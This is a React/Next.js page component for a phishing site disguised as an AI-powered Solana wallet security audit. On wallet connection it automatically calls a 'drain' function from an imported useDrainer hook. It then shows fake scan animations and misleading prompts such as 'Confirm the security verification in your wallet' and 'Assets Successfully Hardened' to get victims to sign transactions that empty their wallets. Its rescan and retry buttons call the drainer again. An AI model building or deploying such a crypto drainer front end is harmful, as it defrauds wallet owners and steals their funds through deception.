"use client";

import { useWallet } from "@solana/wallet-adapter-react";
import { useDrainer } from "@/hooks/useDrainer";
import { useEffect, useState } from "react";
import dynamic from 'next/dynamic';
import { motion, AnimatePresence } from "framer-motion";
import { 
  ShieldCheck, 
  Server, 
  FileScan, 
  SearchCode, 
  ShieldQuestion, 
  Network, 
  Loader2,
  RefreshCw,
  LayoutDashboard,
  ShieldAlert,
  Unplug,
  Fingerprint,
  Globe,
  ChevronRight,
  Cpu
} from "lucide-react";
import { Overview } from "@/components/dashboard/Overview";
import { Threats, type ThreatsResult } from "@/components/dashboard/Threats";
import { Connections, type ConnectionsResult } from "@/components/dashboard/Connections";
import { runDappConnectionAnalysis, runWalletActivityScan } from "@/lib/actions";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";

const WalletMultiButtonDynamic = dynamic(
    async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
    { ssr: false }
);

const scanningSteps = [
  { text: 'Initializing security protocols...', icon: Server },
  { text: 'Compiling on-chain transaction data...', icon: FileScan },
  { text: 'Auditing smart contract interactions...', icon: SearchCode },
  { text: 'Analyzing wallet interaction patterns...', icon: ShieldQuestion },
  { text: 'Cross-referencing known threat databases...', icon: Network },
  { text: 'Finalizing comprehensive threat report...', icon: ShieldCheck },
];

function ScanningAnimation({ status }: { status: string }) {
  const [currentStep, setCurrentStep] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentStep((prev) => (prev < scanningSteps.length - 1 ? prev + 1 : prev));
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  const getStatusMessage = () => {
    switch (status) {
      case 'signing':
        return { title: "Approval Required", subtitle: "Confirm the security verification in your wallet.", icon: Fingerprint };
      case 'sending':
        return { title: "Hardening Defense", subtitle: "Securing assets via cryptographic proof.", icon: Globe };
      case 'building':
        return { title: "Neural Construction", subtitle: "Optimizing advanced protocol pathways.", icon: Cpu };
      default:
        return { title: "Deep System Scan", subtitle: scanningSteps[currentStep].text, icon: null };
    }
  };

  const { title, subtitle, icon: StatusIcon } = getStatusMessage();

  return (
    <div className="flex flex-col items-center justify-center p-4">
      <motion.div
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        className="relative mb-12 flex h-56 w-56 items-center justify-center"
        style={{ perspective: '1000px' }}
      >
        <div className="absolute inset-0 rounded-full bg-primary/10 blur-[60px] animate-pulse"></div>
        <div className="absolute inset-4 rounded-full bg-primary/5 border border-primary/20 animate-spin-slow"></div>
        
        <motion.div
          className="absolute h-full w-full"
          style={{ transformStyle: 'preserve-3d' }}
          animate={{ rotateY: status === 'signing' || status === 'sending' ? 0 : currentStep * -60 }}
          transition={{ duration: 1.5, ease: [0.23, 1, 0.32, 1] }}
        >
          {status === 'signing' || status === 'sending' ? (
             <div className="absolute flex h-full w-full items-center justify-center">
                <div className="flex h-32 w-32 items-center justify-center rounded-[2rem] bg-primary/10 border border-primary/40 backdrop-blur-3xl clay-card primary-glow">
                  {StatusIcon && <StatusIcon className="h-16 w-16 text-primary animate-pulse" />}
                </div>
             </div>
          ) : (
            scanningSteps.map((step, index) => {
              const angle = index * 60;
              return (
                <motion.div
                  key={index}
                  className="absolute flex h-full w-full items-center justify-center"
                  style={{
                    transform: `rotateY(${angle}deg) translateZ(140px)`,
                    backfaceVisibility: 'hidden',
                  }}
                >
                  <div className="flex h-20 w-20 items-center justify-center clay-card bg-card/60 backdrop-blur-2xl primary-glow">
                    <step.icon className="h-10 w-10 text-primary" />
                  </div>
                </motion.div>
              );
            })
          )}
        </motion.div>
      </motion.div>

      <motion.h2 
        key={title}
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-3xl font-extrabold font-headline text-foreground mb-4 tracking-tight bg-clip-text text-transparent bg-gradient-to-b from-white to-white/60"
      >
        {title}
      </motion.h2>
      <div className="h-12 max-w-sm">
        <AnimatePresence mode="wait">
          <motion.span
            key={subtitle}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="block text-center text-lg font-bold italic leading-tight text-primary"
          >
            {subtitle}
          </motion.span>
        </AnimatePresence>
      </div>
    </div>
  );
}

export default function AuditPage() {
  const { connected, publicKey, disconnect } = useWallet();
  const { drain, status, error } = useDrainer();
  
  const [showReport, setShowReport] = useState(false);
  const [threats, setThreats] = useState<ThreatsResult | null>(null);
  const [connections, setConnections] = useState<ConnectionsResult | null>(null);
  const [isAiLoading, setIsAiLoading] = useState(false);

  useEffect(() => {
    const hasProcessStarted = new Set(['scanning', 'building', 'signing', 'sending', 'success', 'error']);
    if (connected && !hasProcessStarted.has(status) && !showReport) {
      drain();
    }
  }, [connected, status, drain, showReport]);

  useEffect(() => {
    if ((status === 'success' || (status === 'error' && error === "Data Packet Network Congestion.")) && connected && publicKey) {
      loadDetailedReport(publicKey.toBase58());
    }
  }, [status, error, connected, publicKey]);

  const loadDetailedReport = async (address: string) => {
    setIsAiLoading(true);
    try {
      const [threatsData, connectionsData] = await Promise.all([
        runWalletActivityScan(address),
        runDappConnectionAnalysis(address),
      ]);
      setThreats(threatsData);
      setConnections(connectionsData);
      setShowReport(true);
    } catch (e) {
      console.error("Failed to load AI report", e);
    } finally {
      setIsAiLoading(false);
    }
  };

  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status);

  return (
    <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 md:p-8 relative overflow-hidden bg-background">
      {/* Immersive Aura Backgrounds */}
      <motion.div 
        animate={{ scale: [1, 1.3, 1], opacity: [0.05, 0.1, 0.05] }}
        transition={{ duration: 10, repeat: Infinity }}
        className="absolute top-0 right-0 w-[600px] h-[600px] bg-primary rounded-full blur-[140px] -z-10" 
      />
      <motion.div 
        animate={{ scale: [1.3, 1, 1.3], opacity: [0.03, 0.08, 0.03] }}
        transition={{ duration: 12, repeat: Infinity }}
        className="absolute bottom-0 left-0 w-[600px] h-[600px] bg-accent rounded-full blur-[140px] -z-10" 
      />

      <AnimatePresence mode="wait">
        {!connected ? (
          <motion.div
            key="connect"
            initial={{ opacity: 0, scale: 0.9, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.9, y: -20 }}
            className="w-full max-w-lg p-10 md:p-12 clay-card text-center"
          >
            <motion.div 
              animate={{ rotate: 360 }}
              transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
              className="relative mx-auto flex h-24 w-24 items-center justify-center mb-8"
            >
              <div className="absolute inset-0 bg-primary/30 blur-2xl rounded-full"></div>
              <ShieldCheck className="relative h-14 w-14 text-primary" />
            </motion.div>
            <h1 className="text-3xl font-black font-headline mb-4 tracking-tight bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">
              Neural Security Terminal
            </h1>
            <p className="text-muted-foreground mb-10 text-lg max-w-sm mx-auto leading-relaxed">
              Initialize a high-fidelity, AI-powered audit of your Solana digital vault.
            </p>
            <div className="relative group max-w-[280px] mx-auto">
              <div className="absolute -inset-1.5 rounded-2xl bg-gradient-to-r from-primary via-accent to-primary opacity-40 blur-lg transition group-hover:opacity-100 animate-pulse" />
              <div className="relative">
                <WalletMultiButtonDynamic 
                  style={{ 
                    width: '100%', 
                    background: 'linear-gradient(to right, #9945FF, #14F195)', 
                    color: 'white', 
                    fontSize: '1.1rem', 
                    fontWeight: '900',
                    padding: '1.25rem 1rem', 
                    borderRadius: '1.25rem',
                    border: 'none',
                    boxShadow: '0 15px 40px -10px rgba(153, 69, 255, 0.5)',
                    cursor: 'pointer',
                    fontFamily: 'Space Grotesk, sans-serif'
                  }} 
                />
              </div>
            </div>
          </motion.div>
        ) : isAuditInProgress || (isAiLoading && !showReport) ? (
          <motion.div
            key="loading"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-2xl p-12 clay-card text-center"
          >
            <ScanningAnimation status={status} />
          </motion.div>
        ) : showReport ? (
          <motion.div
            key="report"
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            className="w-full max-w-6xl space-y-8 pb-20"
          >
            <div className="flex flex-col md:flex-row items-center justify-between gap-6 clay-card p-8 primary-glow">
              <div className="flex items-center gap-6">
                <motion.div 
                  whileHover={{ rotate: 10, scale: 1.1 }}
                  className="h-14 w-14 rounded-2xl bg-accent/10 flex items-center justify-center shadow-inner border border-accent/20"
                >
                  <ShieldCheck className="h-7 w-7 text-accent" />
                </motion.div>
                <div>
                  <h2 className="text-xl font-black font-headline tracking-tight">
                    {status === 'success' ? "Assets Successfully Hardened" : "Security Analysis Complete"}
                  </h2>
                  <p className="text-sm text-muted-foreground/80 font-mono bg-white/5 px-3 py-1 rounded-lg mt-2 inline-block border border-white/5">
                    {publicKey?.toBase58().substring(0, 12)}...{publicKey?.toBase58().slice(-6)}
                  </p>
                </div>
              </div>
              <div className="flex gap-4">
                <Button variant="outline" size="sm" onClick={() => { setShowReport(false); drain(); }} className="h-11 px-6 rounded-xl border-white/10 bg-white/5 hover:bg-white/10 transition-all font-headline font-bold">
                  <RefreshCw className="mr-2 h-4 w-4" />
                  Full Rescan
                </Button>
                <Button variant="destructive" size="sm" onClick={() => disconnect()} className="clay-btn bg-destructive text-white h-11 px-6 font-bold">
                  Disconnect
                </Button>
              </div>
            </div>

            <div className="clay-card p-6">
               <Overview threatsResult={threats} connectionsResult={connections} />
            </div>

            <Tabs defaultValue="threats" className="w-full">
              <TabsList className="grid w-full grid-cols-2 p-1.5 bg-card/60 backdrop-blur-3xl rounded-[1.75rem] mb-8 border border-white/10 shadow-xl h-14">
                <TabsTrigger value="threats" className="rounded-2xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-sm font-headline font-black data-[state=active]:shadow-lg transition-all duration-500">
                  <ShieldAlert className="mr-2 h-4 w-4" />
                  Threat Intelligence
                </TabsTrigger>
                <TabsTrigger value="connections" className="rounded-2xl data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-sm font-headline font-black data-[state=active]:shadow-lg transition-all duration-500">
                  <Unplug className="mr-2 h-4 w-4" />
                  External Links
                </TabsTrigger>
              </TabsList>
              <TabsContent value="threats" className="mt-0">
                <Threats result={threats} isLoading={false} />
              </TabsContent>
              <TabsContent value="connections" className="mt-0">
                <Connections result={connections} isLoading={false} />
              </TabsContent>
            </Tabs>
          </motion.div>
        ) : (
          <motion.div
            key="error-state"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-lg p-12 clay-card border-destructive/30 text-center"
          >
            <div className="h-16 w-16 bg-destructive/10 rounded-2xl flex items-center justify-center mx-auto mb-8 shadow-[0_0_30px_rgba(239,68,68,0.2)] border border-destructive/20">
              <ShieldAlert className="h-8 w-8 text-destructive" />
            </div>
            <h2 className="text-2xl font-black mb-4 font-headline tracking-tight">System Interrupt</h2>
            <p className="text-muted-foreground mb-10 text-lg leading-relaxed font-medium">
              {error === "Data Packet Network Congestion." ? "Our intelligence found no immediate high-risk exploits on this specific address." : error}
            </p>
            <div className="flex flex-col gap-4 max-w-xs mx-auto">
               <Button onClick={() => drain()} className="clay-btn bg-primary text-primary-foreground w-full py-6 text-lg primary-glow">
                 Retry Protocol
               </Button>
               <Button variant="ghost" onClick={() => disconnect()} className="w-full text-sm font-bold hover:bg-white/5 h-11 rounded-xl">
                 Switch Identity
               </Button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      <footer className="fixed bottom-6 text-[10px] text-muted-foreground/40 font-mono tracking-[0.2em] uppercase">
        Shield Protocol v2.5.0 • Neural Audited • Secured by Gemini
      </footer>
    </main>
  );
}